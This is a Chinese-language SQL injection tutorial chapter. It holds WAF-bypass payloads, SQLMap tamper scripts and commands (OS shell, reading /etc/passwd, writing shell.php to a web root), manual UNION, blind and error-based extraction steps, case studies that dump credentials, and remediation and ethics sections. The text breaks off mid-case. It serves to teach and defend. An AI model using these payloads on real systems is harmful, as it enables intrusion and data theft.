?id=1'/**/UNION/**/SELECT/**/1,2,3--/**/-
?id=1'%09UNION%09SELECT%091,2,3--%09-
?id=1'%0AUNION%0ASELECT%0A1,2,3--%0A-
?id=1'%0DUNION%0DSELECT%0D1,2,3--%0D-
?id=1'%0CUNION%0CSELECT%0C1,2,3--%0C-
```

**方法8：括号绕过**
```sql
?id=1'UNION(SELECT(1),(2),(3))-- -
```

**方法9：内联注释（MySQL特有）**
```sql
?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
?id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
```

**方法10：HTTP参数污染（HPP）**
```
?id=1&id=2
?id=1' UNION SELECT 1,2,3-- -&id=2
```

**方法11：HTTP参数碎片（HPF）**
```
?id=1' UNION SELECT &id=1,2,3-- -
```

**方法12：修改请求方法**
```
GET → POST
POST → GET
```

**方法13：修改Content-Type**
```
application/x-www-form-urlencoded → multipart/form-data
application/x-www-form-urlencoded → application/json
```

**方法14：使用Cookie传递参数**
```
GET参数 → Cookie参数
POST参数 → Cookie参数
```

**方法15：使用HTTP头传递参数**
```
X-Forwarded-For: 1' UNION SELECT 1,2,3-- -
X-Custom-Header: 1' UNION SELECT 1,2,3-- -
```

**方法16：分块传输编码**
```
Transfer-Encoding: chunked

1' UNION SELECT 1,2,3-- -
```

**方法17：HTTP方法混淆**
```
使用QUERY方法或其他非标准方法
```

**方法18：IPV6地址绕过**
```
使用[::1]代替127.0.0.1
```

**方法19：URL路径混淆**
```
/page?id=1 → /page/?.id=1
/page?id=1 → /page/?.id=1&id=2
```

**方法20：使用%00截断**
```
?id=1' UNION SELECT 1,2,3%00-- -
```

**方法21：使用缓冲区溢出**
```
?id=1' + 'A'*1000 + 'UNION SELECT 1,2,3-- -
```

**方法22：使用%23代替#**
```
?id=1' UNION SELECT 1,2,3%23
```

**方法23：使用科学计数法**
```
?id=1e0' UNION SELECT 1,2,3-- -
```

**方法24：使用换行和Tab混合**
```
?id=1'%0A%09UNION%0A%09SELECT%0A%091,2,3--%0A%09-
```

### 5.12.6 SQLMap Tamper脚本详解

SQLMap自带了很多Tamper脚本，用于绕过各种WAF和过滤。

**查看所有Tamper脚本**
```bash
sqlmap --list-tampers
```

**常用Tamper脚本**

| 脚本 | 功能 | 适用场景 |
|-----|------|---------|
| apostrophemask | 将单引号替换为UTF-8 | 过滤单引号 |
| apostrophenullencode | 用非法双字节Unicode替换单引号 | 过滤单引号 |
| appendnullbyte | 在payload末尾加空字节 | 过滤检测 |
| base64encode | Base64编码所有字符 | Base64参数 |
| between | 将>替换为NOT BETWEEN 0 AND | 过滤> |
| bluecoat | Blue Coat WAF绕过 | Blue Coat WAF |
| chardoubleencode | 双重URL编码 | 简单WAF |
| charencode | URL编码 | 简单过滤 |
| charunicodeencode | Unicode编码 | 过滤特殊字符 |
| charunicodeescape | Unicode转义 | 过滤特殊字符 |
| commalesslimit | 用OFFSET替换LIMIT中的逗号 | 过滤逗号 |
| commalessmid | 用MID(...) FROM ... FOR ...替换MID(..., ..., ...) | 过滤逗号 |
| commentbeforeparentheses | 在括号前加注释 | 检测括号 |
| concat2concatws | 用CONCAT_WS替换CONCAT | 过滤CONCAT |
| equaltolike | 将=替换为LIKE | 过滤等号 |
| escapequotes | 转义引号 | 转义引号 |
| greatest | 将>替换为GREATEST | 过滤> |
| halfversionedmorekeywords | 关键字前加版本化注释 | MySQL WAF |
| hex2char | 将每个字符串编码为CHAR(0xXX,...) | 过滤引号 |
| htmlencode | HTML实体编码 | HTML编码 |
| ifnull2casewhenisnull | 用CASE替换IFNULL | 过滤IFNULL |
| ifnull2ifisnull | 用IF(ISNULL(...))替换IFNULL | 过滤IFNULL |
| informationschemacomment | 在information_schema后加注释 | 过滤information_schema |
| least | 将>替换为LEAST | 过滤> |
| lowercase | 转换为小写 | 检测大写 |
| modsecurityversioned | 完整查询用版本化注释包裹 | ModSecurity |
| modsecurityzeroversioned | 完整查询用/*!00000*/包裹 | ModSecurity |
| multiplespaces | 添加多个空格 | 空格检测 |
| nonrecursivereplacement | 双写关键字替换 | 递归替换 |
| overlongutf8 | 超长UTF8编码 | 简单WAF |
| overlongutf8more | 更多超长UTF8编码 | 简单WAF |
| percentage | 每个字符前加% | ASP/IIS |
| plus2concat | 用+替换CONCAT | MSSQL |
| plus2fnconcat | 用ODBC函数替换CONCAT | MSSQL |
| randomcase | 随机大小写 | 大小写检测 |
| randomcomments | 随机插入注释 | 关键字检测 |
| securesphere | Securesphere WAF绕过 | Securesphere WAF |
| sp_password | 添加sp_password | MSSQL日志 |
| space2comment | 空格替换为/**/ | 过滤空格 |
| space2dash | 空格替换为--注释 | 过滤空格 |
| space2hash | 空格替换为#注释 | 过滤空格（MySQL） |
| space2morecomment | 空格替换为/**_**/ | 过滤空格 |
| space2morehash | 空格替换为#和换行 | 过滤空格（MySQL） |
| space2mssqlblank | 空格替换为其他空白字符 | MSSQL |
| space2mssqlhash | 空格替换为%23%0A | MSSQL |
| space2mysqlblank | 空格替换为其他空白字符 | MySQL |
| space2mysqldash | 空格替换为--%0A | MySQL |
| space2plus | 空格替换为+ | 过滤空格 |
| space2randomblank | 空格替换为随机空白字符 | 过滤空格 |
| symboliclogical | 用&&和||替换AND和OR | 过滤AND/OR |
| unionalltounion | 用UNION替换UNION ALL | 检测UNION ALL |
| unmagicquotes | 用%df%27替换' | GPC开启 |
| uppercase | 转换为大写 | 检测小写 |
| varnish | Varnish WAF绕过 | Varnish WAF |
| versionedkeywords | 关键字用版本化注释包裹 | MySQL WAF |
| versionedmorekeywords | 每个关键字用版本化注释包裹 | MySQL WAF |
| xforwardedfor | 添加X-Forwarded-For头 | 基于IP的WAF |

**Tamper脚本组合使用**
```bash
# 使用多个tamper脚本
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,randomcase,charencode

# 常用组合
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,randomcase
sqlmap -u "http://example.com/page?id=1" --tamper=base64encode
sqlmap -u "http://example.com/page?id=1" --tamper=charunicodeencode
sqlmap -u "http://example.com/page?id=1" --tamper=between,greatest,equaltolike
```

## 5.13 SQLMap高级用法

### 5.13.1 SQLMap常用参数详解

**目标指定**
```bash
# 直接指定URL
sqlmap -u "http://example.com/page?id=1"

# 从文件读取URL列表
sqlmap -m urls.txt

# 从Burp请求文件读取
sqlmap -r request.txt

# 指定Google搜索结果
sqlmap -g "inurl:page.php?id="
```

**参数指定**
```bash
# 指定测试参数
sqlmap -u "http://example.com/page?id=1&name=test" -p id,name

# 指定POST数据
sqlmap -u "http://example.com/login" --data="username=admin&password=123"

# 指定Cookie
sqlmap -u "http://example.com/page" --cookie="id=1"

# 指定User-Agent
sqlmap -u "http://example.com/page?id=1" --user-agent="Mozilla/5.0"

# 随机User-Agent
sqlmap -u "http://example.com/page?id=1" --random-agent

# 指定Referer
sqlmap -u "http://example.com/page?id=1" --referer="http://example.com"

# 指定额外HTTP头
sqlmap -u "http://example.com/page?id=1" --headers="X-Forwarded-For: 127.0.0.1\nX-Custom: test"
```

**请求方式**
```bash
# 指定HTTP方法
sqlmap -u "http://example.com/page?id=1" --method=POST

# 指定认证
sqlmap -u "http://example.com/page?id=1" --auth-type=Basic --auth-cred="admin:admin"

# 使用代理
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"

# 使用Tor
sqlmap -u "http://example.com/page?id=1" --tor

# 延迟请求
sqlmap -u "http://example.com/page?id=1" --delay=1

# 超时时间
sqlmap -u "http://example.com/page?id=1" --timeout=30

# 重试次数
sqlmap -u "http://example.com/page?id=1" --retries=3
```

**注入技术**
```bash
# 指定注入技术
# B: 布尔盲注, E: 报错注入, U: Union注入, S: 堆叠注入, T: 时间盲注, Q: 内联查询
sqlmap -u "http://example.com/page?id=1" --technique=BEUSTQ

# 指定数据库类型
sqlmap -u "http://example.com/page?id=1" --dbms=MySQL

# 指定操作系统
sqlmap -u "http://example.com/page?id=1" --os=Linux

# 指定表前缀
sqlmap -u "http://example.com/page?id=1" --prefix="" --suffix=""

# 风险等级（1-3）
sqlmap -u "http://example.com/page?id=1" --risk=3

# 测试等级（1-5）
sqlmap -u "http://example.com/page?id=1" --level=5
```

**枚举数据**
```bash
# 获取所有数据库
sqlmap -u "http://example.com/page?id=1" --dbs

# 获取当前数据库
sqlmap -u "http://example.com/page?id=1" --current-db

# 获取当前用户
sqlmap -u "http://example.com/page?id=1" --current-user

# 获取数据库用户
sqlmap -u "http://example.com/page?id=1" --users

# 获取数据库密码哈希
sqlmap -u "http://example.com/page?id=1" --passwords

# 获取表
sqlmap -u "http://example.com/page?id=1" -D dbname --tables

# 获取列
sqlmap -u "http://example.com/page?id=1" -D dbname -T tablename --columns

# 获取数据
sqlmap -u "http://example.com/page?id=1" -D dbname -T tablename --dump

# 获取所有数据
sqlmap -u "http://example.com/page?id=1" --dump-all

# 指定列
sqlmap -u "http://example.com/page?id=1" -D dbname -T tablename -C username,password --dump

# 指定行数
sqlmap -u "http://example.com/page?id=1" -D dbname -T tablename --dump --start=1 --stop=10
```

**高级功能**
```bash
# 执行SQL语句
sqlmap -u "http://example.com/page?id=1" --sql-query="SELECT version()"

# SQL Shell
sqlmap -u "http://example.com/page?id=1" --sql-shell

# 操作系统命令
sqlmap -u "http://example.com/page?id=1" --os-cmd="whoami"

# OS Shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# 读取文件
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 搜索表/列
sqlmap -u "http://example.com/page?id=1" --search -T admin
sqlmap -u "http://example.com/page?id=1" --search -C password

# 爬取网站
sqlmap -u "http://example.com/" --crawl=3

# 表单解析
sqlmap -u "http://example.com/login" --forms
```

**优化选项**
```bash
# 多线程
sqlmap -u "http://example.com/page?id=1" --threads=10

# 预测输出
sqlmap -u "http://example.com/page?id=1" --predict-output

# 保持连接
sqlmap -u "http://example.com/page?id=1" --keep-alive

# NULL连接
sqlmap -u "http://example.com/page?id=1" --null-connection

# 优化（开启所有优化选项）
sqlmap -u "http://example.com/page?id=1" -o
```

**其他选项**
```bash
# 详细级别（0-6）
sqlmap -u "http://example.com/page?id=1" -v 3

# 不询问，使用默认值
sqlmap -u "http://example.com/page?id=1" --batch

# 输出文件
sqlmap -u "http://example.com/page?id=1" --output-dir="./output"

# 会话文件
sqlmap -u "http://example.com/page?id=1" -s session.sqlite

# 恢复会话
sqlmap -u "http://example.com/page?id=1" --resume

# 刷新会话
sqlmap -u "http://example.com/page?id=1" --flush-session

# Tamper脚本
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,randomcase
```

### 5.13.2 SQLMap实战技巧

**技巧1：使用-r参数从Burp导出请求**
1. 在Burp中找到目标请求
2. 右键 → Copy to file
3. 使用sqlmap -r request.txt进行测试

**技巧2：使用--batch自动化运行**
```bash
sqlmap -u "http://example.com/page?id=1" --batch --dbs
```

**技巧3：使用--level和--risk提高测试强度**
```bash
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
```

**技巧4：使用--threads提高速度**
```bash
sqlmap -u "http://example.com/page?id=1" --threads=10 --dbs
```

**技巧5：使用Tamper脚本绕过WAF**
```bash
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,randomcase,charencode --dbs
```

**技巧6：使用--proxy通过Burp调试**
```bash
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080" --dbs
```

**技巧7：使用--delay避免被封**
```bash
sqlmap -u "http://example.com/page?id=1" --delay=2 --dbs
```

**技巧8：使用--data测试POST参数**
```bash
sqlmap -u "http://example.com/login" --data="username=admin&password=123" -p username
```

**技巧9：使用--cookie测试Cookie注入**
```bash
sqlmap -u "http://example.com/page" --cookie="id=1*" --dbs
```

**技巧10：使用--search快速定位敏感表**
```bash
sqlmap -u "http://example.com/page?id=1" --search -T admin
sqlmap -u "http://example.com/page?id=1" --search -C password
```

## 5.14 手工注入技巧

### 5.14.1 为什么要学习手工注入

虽然SQLMap等自动化工具功能强大，但手工注入仍然非常重要：

1. **工具无法覆盖所有场景**：一些特殊的注入点需要手工测试
2. **理解原理更重要**：手工注入能帮助你深入理解SQL注入原理
3. **绕过WAF**：手工构造的payload可能绕过WAF检测
4. **面试要求**：很多安全岗位面试要求手工注入能力
5. **CTF比赛**：CTF比赛中经常需要手工注入

### 5.14.2 手工注入流程

**第一步：确认注入点**
```
?id=1'   # 报错或异常
?id=1 AND 1=1   # 正常
?id=1 AND 1=2   # 异常
```

**第二步：判断注入类型**
- 有回显 → Union注入或报错注入
- 无回显但有差异 → 布尔盲注
- 完全无差异 → 时间盲注

**第三步：判断数据库类型**
- 有information_schema → MySQL/MSSQL/PostgreSQL
- 有dual表 → Oracle/MySQL
- 有@@version → MSSQL/MySQL
- 有v$version → Oracle

**第四步：获取数据库名**
```sql
-- MySQL Union注入
?id=-1 UNION SELECT 1,database(),3

-- MySQL 报错注入
?id=1 AND extractvalue(1,concat(0x7e,database(),0x7e))
```

**第五步：获取表名**
```sql
-- MySQL
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
```

**第六步：获取列名**
```sql
-- MySQL
?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'
```

**第七步：获取数据**
```sql
-- MySQL
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users
```

### 5.14.3 手工注入提速技巧

**技巧1：使用二分法**
对于盲注，使用二分法可以大大提高效率：
```python
# 伪代码
low = 32
high = 127
while low < high:
    mid = (low + high) // 2
    if ascii(char) > mid:
        low = mid + 1
    else:
        high = mid
result = chr(low)
```

**技巧2：使用group_concat一次性获取所有数据**
```sql
-- 获取所有表名
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()

-- 获取所有列名
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'

-- 获取所有数据
SELECT group_concat(username,0x3a,password,0x0a) FROM users
```

**技巧3：使用concat_ws连接多个字段**
```sql
SELECT concat_ws(0x3a, id, username, password) FROM users
```

**技巧4：使用limit分页获取数据**
```sql
SELECT username FROM users LIMIT 0,1
SELECT username FROM users LIMIT 1,1
SELECT username FROM users LIMIT 2,1
```

**技巧5：使用ord()和ascii()获取字符ASCII码**
```sql
SELECT ascii(substr(database(),1,1))
SELECT ord(substr(database(),1,1))
```

### 5.14.4 无information_schema时的注入

有些情况下（比如权限不足或数据库不支持），无法使用information_schema，这时可以使用其他方法：

**方法1：暴力枚举表名**
```sql
?id=1 AND (SELECT count(*) FROM users) > 0
-- 如果正常，说明存在users表
```

**方法2：使用order by猜测列数**
```sql
?id=1 ORDER BY 1
?id=1 ORDER BY 2
-- ...
```

**方法3：使用union select猜测列类型**
```sql
?id=-1 UNION SELECT 1,2,3
-- 观察哪几列显示
```

## 5.15 不同数据库注入差异

### 5.15.1 MySQL vs MSSQL vs Oracle vs PostgreSQL

**基本信息获取**

| 功能 | MySQL | MSSQL | Oracle | PostgreSQL |
|-----|-------|-------|--------|------------|
| 当前用户 | user() | system_user | user FROM dual | current_user |
| 当前数据库 | database() | db_name() | user (等同于schema) | current_database() |
| 版本 | version() | @@version | banner FROM v$version | version() |
| 服务器名 | @@hostname | @@servername | host_name FROM v$instance | inet_server_addr() |

**系统表/视图**

| 功能 | MySQL | MSSQL | Oracle | PostgreSQL |
|-----|-------|-------|--------|------------|
| 数据库列表 | information_schema.schemata | sysdatabases / sys.databases | all_users / dba_users | pg_database |
| 表列表 | information_schema.tables | sysobjects / sys.tables | all_tables | pg_tables |
| 列列表 | information_schema.columns | syscolumns / sys.columns | all_tab_columns | information_schema.columns |

**字符串操作**

| 功能 | MySQL | MSSQL | Oracle | PostgreSQL |
|-----|-------|-------|--------|------------|
| 字符串长度 | length() | len() | length() | length() |
| 子串 | substr() | substring() | substr() | substr() |
| 字符串连接 | concat() | + | \|\| | \|\| / concat() |
| ASCII码 | ascii() | ascii() | ascii() | ascii() |
| ASCII转字符 | char() | char() | chr() | chr() |

**延时函数**

| 数据库 | 延时函数 |
|-------|---------|
| MySQL | sleep(n), benchmark(n, func) |
| MSSQL | WAITFOR DELAY '0:0:n' |
| Oracle | DBMS_LOCK.SLEEP(n), DBMS_PIPE.RECEIVE_MESSAGE |
| PostgreSQL | pg_sleep(n) |
| Access | 无内置函数，用笛卡尔积 |

**注释**

| 数据库 | 单行注释 | 多行注释 |
|-------|---------|---------|
| MySQL | -- 或 # | /* */ |
| MSSQL | -- | /* */ |
| Oracle | -- | /* */ |
| PostgreSQL | -- | /* */ |
| Access | 无 | 无 |

### 5.15.2 MySQL注入要点

1. **information_schema**：MySQL 5.0+支持information_schema
2. **文件操作**：
   - 读取文件：load_file('/path/to/file')
   - 写入文件：SELECT ... INTO OUTFILE '/path/to/file'
   - 写入文件：SELECT ... INTO DUMPFILE '/path/to/file'
3. **UDF提权**：可以通过创建UDF执行系统命令
4. **宽字节注入**：GBK编码可能存在宽字节注入
5. **报错注入函数多**：extractvalue、updatexml、floor、exp等

### 5.15.3 MSSQL注入要点

1. **存储过程**：
   - xp_cmdshell：执行系统命令
   - xp_regread：读取注册表
   - xp_servicecontrol：控制服务
2. **堆叠注入**：MSSQL默认支持堆叠查询
3. **SA权限**：SA账号权限很高，可以执行系统命令
4. **报错注入**：利用类型转换错误
5. **OPENROWSET**：可以连接其他数据库

### 5.15.4 Oracle注入要点

1. **dual表**：很多查询需要FROM dual
2. **权限分级**：DBA、RESOURCE、CONNECT等角色
3. **UTL_HTTP**：可以发起HTTP请求
4. **DBMS_PIPE**：可以用来延时
5. **JAVA权限**：有JAVA权限可以执行系统命令
6. **表名大写**：Oracle默认表名、列名都是大写

### 5.15.5 PostgreSQL注入要点

1. **pg_sleep**：延时函数
2. **COPY FROM PROGRAM**：PostgreSQL 9.3+可以执行系统命令
3. **UDF**：可以创建自定义函数
4. **dblink**：可以连接其他数据库
5. **XML函数**：可以利用XML函数进行报错注入

### 5.15.6 Access注入要点

1. **无系统表**：没有information_schema，需要暴力枚举
2. **无注释**：没有标准的SQL注释
3. **无union多表**：UNION只能用于相同结构的表
4. **ADODB.Connection**：常见的ASP+Access组合
5. **错误信息**：通过ODBC错误信息获取数据

## 5.16 SQL注入的危害评估

### 5.16.1 严重程度评估维度

评估SQL注入漏洞的严重程度，需要考虑多个维度：

**1. 数据敏感程度**
- 核心业务数据（用户信息、交易数据等）→ 严重
- 一般业务数据 → 中等
- 公开数据 → 低

**2. 数据量大小**
- 全库数据泄露 → 严重
- 部分数据泄露 → 中等
- 少量数据泄露 → 低

**3. 可执行的操作**
- 可以执行系统命令、提权 → 严重
- 可以增删改数据 → 高
- 只能查询数据 → 中
- 只能盲注、效率低 → 低

**4. 数据库权限**
- DBA/SA权限 → 严重
- 普通用户权限 → 中
- 只读权限 → 低

**5. 利用难度**
- 直接GET参数，无需认证 → 严重
- 需要登录或特殊权限 → 中
- 需要特定条件或绕过 → 低

### 5.16.2 常见SRC评级标准

参考各大SRC平台的评级标准：

**严重（Critical）**
- 可获取数据库全部敏感数据
- 可执行系统命令，获取服务器权限
- 核心业务数据库注入
- 可导致业务中断的数据操作

**高危（High）**
- 可获取大量用户敏感信息
- 可修改/删除重要数据
- 数据库为DBA权限
- 涉及交易、资金等核心业务

**中危（Medium）**
- 可获取部分用户信息
- 只能查询不能修改
- 非核心业务数据
- 需要一定条件才能利用

**低危（Low）**
- 只能进行盲注，数据获取困难
- 只能获取非敏感数据
- 需要特殊条件或权限
- 影响范围有限

### 5.16.3 漏洞验证时的注意事项

1. **数据验证原则**：只验证漏洞存在，不大量获取数据
2. **最小化原则**：获取最少的数据来证明漏洞
3. **不修改数据**：不要执行UPDATE、DELETE等操作
4. **不删除数据**：不要执行DROP、TRUNCATE等操作
5. **保护隐私**：获取的数据不要泄露，报告后删除
6. **使用测试账号**：优先使用自己注册的测试账号

## 5.17 SQL注入的修复方案

### 5.17.1 代码层面修复

**使用预编译语句（Prepared Statements）**

预编译语句是防止SQL注入最有效的方法。它将SQL语句和参数分开，参数始终被当作数据处理，不会被当作代码执行。

```php
// PHP PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);

// PHP mysqli
$stmt = $mysqli->prepare('SELECT * FROM users WHERE username = ?');
$stmt->bind_param('s', $username);
$stmt->execute();
```

```java
// Java JDBC
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

```python
# Python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

```csharp
// C#
using (SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE username = @username", conn))
{
    cmd.Parameters.AddWithValue("@username", username);
    SqlDataReader reader = cmd.ExecuteReader();
}
```

**使用ORM框架**

ORM（Object-Relational Mapping）框架通常会使用预编译语句，能有效防止SQL注入。

```python
# Django ORM
User.objects.filter(username=username)

# SQLAlchemy
session.query(User).filter(User.username == username)
```

```java
// Hibernate
Query query = session.createQuery("FROM User WHERE username = :username");
query.setParameter("username", username);
```

```php
// Laravel Eloquent
User::where('username', $username)->get();
```

### 5.17.2 输入验证和过滤

**白名单验证**
```php
// 验证数字
if (!is_numeric($id)) {
    die('Invalid input');
}

// 验证字符串长度
if (strlen($username) > 50) {
    die('Input too long');
}

// 验证正则表达式
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die('Invalid username');
}

// 白名单验证字段名
$allowed_fields = ['username', 'email', 'phone'];
if (!in_array($field, $allowed_fields)) {
    die('Invalid field');
}
```

**输入转义**

如果必须使用拼接SQL（不推荐），至少要进行转义：

```php
// PHP
$username = mysqli_real_escape_string($conn, $username);
```

```python
# Python MySQLdb
username = MySQLdb.escape_string(username)
```

注意：转义不如预编译安全，可能存在宽字节注入等绕过方式。

### 5.17.3 架构层面修复

**最小权限原则**
- Web应用使用独立的数据库用户
- 只授予必要的权限（SELECT, INSERT, UPDATE, DELETE）
- 不要使用DBA、SA等管理员账号
- 禁止文件操作权限（FILE权限）

**错误信息处理**
- 生产环境不显示详细的数据库错误信息
- 错误信息只记录在日志中，不返回给前端
- 自定义错误页面，隐藏技术细节

```php
// PHP 关闭错误显示
ini_set('display_errors', 'Off');
error_reporting(0);
```

**WAF防护**
- 部署Web应用防火墙（WAF）
- 配置SQL注入防护规则
- 定期更新WAF规则

**数据库安全配置**
- 禁用不必要的存储过程
- 删除默认账号和测试数据库
- 开启审计日志
- 定期备份数据

### 5.17.4 修复示例

**漏洞代码**
```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysql_query($sql);
?>
```

**修复方案1：预编译语句**
```php
<?php
$id = $_GET['id'];
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$id]);
$result = $stmt->fetchAll();
?>
```

**修复方案2：输入验证+转义**
```php
<?php
$id = $_GET['id'];
if (!is_numeric($id)) {
    die('Invalid id');
}
$id = intval($id);
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysql_query($sql);
?>
```

## 5.18 SQL注入实战注意事项

### 5.18.1 法律和道德规范

1. **获得授权**：只在获得授权的范围内进行测试
2. **遵守规则**：遵守SRC平台的规则和约定
3. **不破坏数据**：不要修改、删除任何数据
4. **保护隐私**：保护用户隐私，不泄露敏感信息
5. **及时报告**：发现漏洞及时报告，不利用漏洞

### 5.18.2 测试中的注意事项

**1. 避免造成数据破坏**
- 不要执行UPDATE、DELETE、DROP等操作
- 不要使用堆叠注入修改数据
- 不要写入文件或上传shell
- 只进行查询验证

**2. 避免影响业务**
- 不要进行大量请求导致服务不可用
- 控制请求频率，使用--delay参数
- 不要进行DDoS式的测试
- 避开业务高峰期

**3. 保护测试环境**
- 优先使用测试环境
- 生产环境测试要格外小心
- 使用测试账号进行测试
- 不要影响真实用户

**4. 数据处理规范**
- 获取的数据只用于漏洞证明
- 报告中敏感数据打码
- 测试完成后删除所有数据
- 不传播、不分享获取的数据

### 5.18.3 提高挖掘效率的技巧

**1. 批量扫描**
- 使用SQLMap的-m参数批量扫描
- 使用爬虫收集URL
- 先扫主站，再扫子站

**2. 重点关注**
- 登录/注册接口
- 搜索功能
- 用户中心
- 订单系统
- 后台管理

**3. 多种注入点测试**
- GET参数
- POST参数
- Cookie
- HTTP头（User-Agent, Referer, X-Forwarded-For等）
- JSON参数
- XML参数

**4. 工具组合使用**
- Burp Suite抓包
- SQLMap注入
- 手工验证
- 浏览器辅助

## 5.19 SQL注入实战案例

### 5.19.1 案例1：电商网站登录注入（Union注入）

**场景描述**
某电商网站登录页面存在SQL注入漏洞。

**漏洞发现过程**
1. 打开登录页面，输入用户名admin'，密码随意
2. 点击登录，页面返回SQL语法错误
3. 确认存在字符型注入

**详细步骤**
```
# 测试单引号
username: admin'
password: 123

# 响应报错
SQL syntax error near ''admin'' AND password='123'
```

**漏洞利用**
```
# 测试列数（假设有4列）
username: admin' ORDER BY 4--
password: 123
# 正常

username: admin' ORDER BY 5--
password: 123
# 报错 → 共4列

# 测试Union注入
username: admin' UNION SELECT 1,2,3,4--
password: 123

# 因为前面的查询可能有结果，需要让它为空
username: '-1' UNION SELECT 1,2,3,4--
password: 123

# 获取数据库信息
username: -1' UNION SELECT 1,database(),version(),4--
password: 123

# 结果
database(): shop_db
version(): 5.7.26
```

**获取用户数据**
```
# 获取表名
username: -1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
password: 123

# 结果
tables: users,products,orders,admin

# 获取列名
username: -1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
password: 123

# 结果
columns: id,username,password,email,phone,address

# 获取数据
username: -1' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users--
password: 123

# 结果
data: admin:admin123,user1:user123,test:test123
```

**报告编写**
- 漏洞名称：电商网站登录页面SQL注入漏洞
- 漏洞类型：SQL注入（Union注入）
- 严重程度：高危
- 影响范围：所有用户数据泄露
- 修复建议：使用预编译语句

### 5.19.2 案例2：新闻网站盲注（布尔盲注）

**场景描述**
某新闻网站文章页面存在SQL注入，但不显示错误信息。

**漏洞发现过程**
1. 打开文章页面：http://news.example.com/article?id=1
2. 测试?id=1 AND 1=1，页面正常
3. 测试?id=1 AND 1=2，页面空白
4. 确认存在布尔盲注

**漏洞利用**
```bash
# 使用SQLMap
sqlmap -u "http://news.example.com/article?id=1" --technique=B --threads=10 --dbs

# 结果
available databases: ['news_db', 'mysql', 'information_schema']

# 获取表
sqlmap -u "http://news.example.com/article?id=1" -D news_db --tables

# 结果
tables: articles,users,comments,categories

# 获取数据
sqlmap -u "http://news.example.com/article?id=1" -D news_db -T users --dump

# 结果
users表数据：管理员账号密码
```

**手工验证思路**
```
# 确认注入
?id=1 AND 1=1   # 正常
?id=1 AND 1=2   # 空白

# 获取数据库名长度
?id=1 AND length(database())>5   # 正常
?id=1 AND length(database())>10  # 异常
# 长度7

# 逐字符猜测数据库名
?id=1 AND ascii(substr(database(),1,1))>110   # 正常
?id=1 AND ascii(substr(database(),1,1))>115   # 异常
?id=1 AND ascii(substr(database(),1,1))=110   # 正常 → 'n'
# 继续...
```

### 5.19.3 案例3：API接口JSON注入

**场景描述**
某APP的API接口存在SQL注入，参数为JSON格式。

**漏洞发现过程**
1. 抓包发现APP使用JSON格式提交数据
2. 修改user_id参数为1'，返回错误
3. 确认存在SQL注入

**漏洞详情**
```
# API请求
POST /api/user/info
Content-Type: application/json

{"user_id": "1"}

# 测试注入
{"user_id": "1'"}

# 响应报错
{"error": "SQL syntax error"}
```

**漏洞利用**
```
# Union注入
{"user_id": "-1 UNION SELECT 1,database(),version(),4"}

# 响应
{"user_id": "1", "username": "app_db", "email": "5.7.26"}

# 获取表名
{"user_id": "-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()"}

# 获取列名
{"user_id": "-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'"}

# 获取数据
{"user_id": "-1 UNION SELECT 1,group_concat(username,password),3,4 FROM users"}
```

### 5.19.4 案例4：宽字节注入挖掘实战

**场景描述**
某论坛使用GBK编码，存在宽字节注入漏洞。

**漏洞发现过程**
1. 发现网站使用GBK编码
2. 测试单引号被转义（addslashes）
3. 尝试宽字节注入：?id=1%df'
4. 页面报错，确认存在宽字节注入

**详细步骤**
```
# 正常访问
?id=1
# 正常

# 测试单引号
?id=1'
# 页面正常，单引号被转义

# 测试宽字节
?id=1%df'
# 页面报错：SQL syntax error
# 说明%df吃掉了转义符\，单引号逃逸
```

**漏洞利用**
```
# 报错注入
?id=1%df' AND extractvalue(1,concat(0x7e,database(),0x7e))-- -

# 获取数据库
XPATH syntax error: '~gbk_db~'

# 获取表名
?id=1%df' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
```

### 5.19.5 案例5：二次注入挖掘实战

**场景描述**
某CMS系统用户注册处存在二次注入漏洞。

**漏洞发现过程**
1. 注册用户名为admin'--的账号
2. 注册成功，说明存储时做了转义
3. 登录后查看个人信息，页面显示admin'--
4. 尝试修改密码，观察是否有异常

**漏洞详情**
```
# 注册账号
username: admin'--
password: test123

# 注册成功，进入个人中心
# 个人信息显示用户名：admin'--

# 修改密码功能
# 后端SQL可能是：
# UPDATE users SET password='newpass' WHERE username='当前用户' AND password='oldpass'

# 如果当前用户是admin'--，SQL变为：
# UPDATE users SET password='newpass' WHERE username='admin'--' AND password='oldpass'
# 即修改admin的密码！
```

**验证过程**
